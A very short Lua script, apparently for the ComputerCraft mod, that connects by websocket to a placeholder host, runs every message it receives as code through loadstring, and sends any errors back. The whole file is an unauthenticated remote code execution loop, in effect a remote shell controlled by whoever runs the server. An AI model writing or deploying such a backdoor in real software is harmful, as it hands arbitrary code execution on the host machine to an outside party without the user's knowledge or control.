local ws = http.websocket("wss://IP")

while true do
    local packet = ws.receive()
    _, err = pcall(loadstring(packet))
    ws.send(err)
end

ws.close()